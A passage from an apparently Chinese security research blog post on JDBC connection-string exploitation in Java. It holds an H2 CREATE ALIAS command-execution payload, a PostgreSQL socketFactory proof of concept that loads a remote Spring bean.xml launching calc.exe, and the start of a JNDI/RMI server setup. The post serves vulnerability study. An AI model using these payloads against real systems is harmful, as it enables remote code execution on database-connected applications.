</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;*&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">// block comment</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">startRemark</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;*&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="n">clearRemark</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="n">endRemark</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">// single line comment</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">startRemark</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">clearRemark</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">endRemark</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;-&#39;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;-&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">// single line comment</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">startRemark</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">clearRemark</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">endRemark</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">default</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">bufferStart</span><span class="p">,</span><span class="w"> </span><span class="n">bufferPos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">bufferStart</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="0x04-h2数据库利用-alias">0x04 H2数据库利用 ALIAS<a hidden class="anchor" aria-hidden="true" href="#0x04-h2数据库利用-alias">#</a></h2>
<p>下载jar，然后我下的是最新版本的，要用jdk17启动，然后直接Connect，就有一个在线h2数据库了</p>
<p><a href="http://www.h2database.com/html/cheatSheet.html">http://www.h2database.com/html/cheatSheet.html</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">jie</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">Java_Test</span><span class="o">&gt;</span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">MyFiles</span><span class="err">\</span><span class="n">Tools</span><span class="err">\</span><span class="n">ENV</span><span class="err">\</span><span class="n">JAVA</span><span class="err">\</span><span class="n">jdk17</span><span class="err">\</span><span class="n">bin</span><span class="err">\</span><span class="n">java</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">cp</span><span class="w"> </span><span class="p">.</span><span class="err">\</span><span class="n">h2</span><span class="o">-</span><span class="n">2</span><span class="p">.</span><span class="na">3</span><span class="p">.</span><span class="na">232</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">tools</span><span class="p">.</span><span class="na">Server</span><span class="w"> </span><span class="o">-</span><span class="n">web</span><span class="w"> </span><span class="o">-</span><span class="n">webAllowOthers</span><span class="w"> </span><span class="o">-</span><span class="n">ifNotExists</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Web</span><span class="w"> </span><span class="n">Console</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">running</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.141.1:8082 (others can connect)</span><span class="w">
</span></span></span></code></pre></div><h3 id="回显">回显<a hidden class="anchor" aria-hidden="true" href="#回显">#</a></h3>
<p>但是这个回显感觉不适用于jdbc，简单看了下jdbc代码，没见返回return的地方</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">DROP ALIAS IF EXISTS SHELLEXEC ;
</span></span><span class="line"><span class="cl">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&#34;\\A&#34;); return s.hasNext() ? s.next() : &#34;&#34;;  }$$;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//调用SHELLEXEC执行命令
</span></span><span class="line"><span class="cl">CALL SHELLEXEC(&#39;whoami&#39;);
</span></span><span class="line"><span class="cl">CALL SHELLEXEC(&#39;ipconfig&#39;);
</span></span></code></pre></div><p><img loading="lazy" src="images/image-20250211155844513.png" alt="image-20250211155844513"  />
</p>
<h1 id="0x4-postgresql">0x4 PostgreSQL<a hidden class="anchor" aria-hidden="true" href="#0x4-postgresql">#</a></h1>
<p><strong>环境</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.postgresql<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>postgresql<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>42.3.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>spring-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>5.3.28<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>spring-expression<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>5.3.28<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>commons-logging<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>commons-logging<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>spring-beans<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>5.3.28<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>spring-context<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>5.3.28<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">PostgreSQL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Connection</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.SQLException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">PsqlJDBCRCE</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SQLException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">socketFactoryClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">socketFactoryArg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;http://127.0.0.1:8000/bean.xml&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">jdbcUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&#34;</span><span class="o">+</span><span class="n">socketFactoryClass</span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&amp;socketFactoryArg=&#34;</span><span class="o">+</span><span class="n">socketFactoryArg</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">jdbcUrl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="0x01-分析-2">0x01 分析<a hidden class="anchor" aria-hidden="true" href="#0x01-分析-2">#</a></h2>
<p>Driver这里对参数进行分类</p>
<p><img loading="lazy" src="images/image-20250214171908157.png" alt="image-20250214171908157"  />
</p>
<p><code>SocketFactoryFactory</code>这里读取出<code>工厂类</code>，并通过<code>ObjectFactory.instantiate()</code>实例化这个类</p>
<p>最后一个参数 <code>PGProperty.SOCKET_FACTORY_ARG.get(info)</code> 获取的我们传入的<code>socketFactoryArg</code></p>
<p><img loading="lazy" src="images/image-20250214171750637.png" alt="image-20250214171750637"  />
</p>
<p>然后这里<code>自构方法调用</code>是有顺序的</p>
<ul>
<li>
<p>Properties.class 参数类型的</p>
</li>
<li>
<p>没有才会调用 String.class</p>
<blockquote>
<p>这里虽然要看<code>tryString</code>参数，但是在上一步，这个地方是写死的为<code>true</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">SocketFactory</span><span class="p">)</span><span class="n">ObjectFactory</span><span class="p">.</span><span class="na">instantiate</span><span class="p">(</span><span class="n">socketFactoryClassName</span><span class="p">,</span><span class="w"> </span><span class="n">info</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="n">PGProperty</span><span class="p">.</span><span class="na">SOCKET_FACTORY_ARG</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">info</span><span class="p">));</span><span class="w">
</span></span></span></code></pre></div></blockquote>
</li>
<li>
<p>最后才会调用 <code>无参自构方法</code></p>
</li>
</ul>
<p>然后如果是<code>String.class</code>，<code>参数值</code>就是我们设置的<code>socketFactoryArg</code></p>
<p><img loading="lazy" src="images/image-20250214172745603.png" alt="image-20250214172745603"  />
</p>
<h2 id="0x02-classpathxmlapplicationcontext">0x02 ClassPathXmlApplicationContext<a hidden class="anchor" aria-hidden="true" href="#0x02-classpathxmlapplicationcontext">#</a></h2>
<p>之后则调用了<code>ClassPathXmlApplicationContext</code> String.class的<code>自构方法</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">new</span><span class="w"> </span><span class="n">ClassPathXmlApplicationContext</span><span class="p">(</span><span class="s">&#34;http://127.0.0.1:8000/bean.xml&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>跟随调用<code>refreshBeanFactory()</code>这里去接收<code>bean.xml</code>数据，生成<code>this.beanFactory</code>对象</p>
<p><img loading="lazy" src="images/image-20250217145657295.png" alt="image-20250217145657295"  />
</p>
<p><code>loadBeanDefinitions()</code>里会去请求设置的地址</p>
<p><img loading="lazy" src="images/image-20250217145901984.png" alt="image-20250217145901984"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;pb&#34;</span> <span class="na">class=</span><span class="s">&#34;java.lang.ProcessBuilder&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;constructor-arg</span> <span class="na">value=</span><span class="s">&#34;calc.exe&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;whatever&#34;</span> <span class="na">value=</span><span class="s">&#34;#{ pb.start() }&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/bean&gt;</span>
</span></span></code></pre></div><p>然后会去<code>实例化</code>id对应的class，且调用<code>对应的自构方法</code>，然后再</p>
<p>实例化通过<code>SimpleInstantiationStrategy</code>的<code>BeanUtils.instantiateClass()</code>实现</p>
<p><img loading="lazy" src="images/image-20250217150232201.png" alt="image-20250217150232201"  />
</p>
<p>然后就是就是执行最后<code>el表达式</code>了，先去找对应的<code>method</code>，然后<code>反射invoke</code>调用</p>
<h1 id="jdbc-总体分析-理解">JDBC 总体分析 理解<a hidden class="anchor" aria-hidden="true" href="#jdbc-总体分析-理解">#</a></h1>
<p>1.<code>DriverManager.getConnection()</code>这个方法有3种传参方式，最后其实都殊途同归，也就是说随便一种都能<code>利用JDBC</code></p>
<p><img loading="lazy" src="images/image-20250214103333352.png" alt="image-20250214103333352"  />
</p>
<p>2.就是选择哪个数据库，他这里是通过一个for然后按照顺序依次<code>connect</code>的，<code>registeredDrivers</code>猜测是获取依赖中存在的数据库</p>
<p><img loading="lazy" src="images/image-20250214102853910.png" alt="image-20250214102853910"  />
</p>
<h1 id="0x5-end-jdbcjndi">0x5 End JDBC+JNDI<a hidden class="anchor" aria-hidden="true" href="#0x5-end-jdbcjndi">#</a></h1>
<p><strong>依赖</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>tomcat-dbcp<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>8.5.56<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>以Tomcat8的<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory</code>为例</p>
<p>server</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">jndi</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Reference</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.StringRefAddr</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIServer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Properties</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Properties</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">PROVIDER_URL</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;rmi://127.0.0.1:1099&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InitialContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">(</span><span class="n">env</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
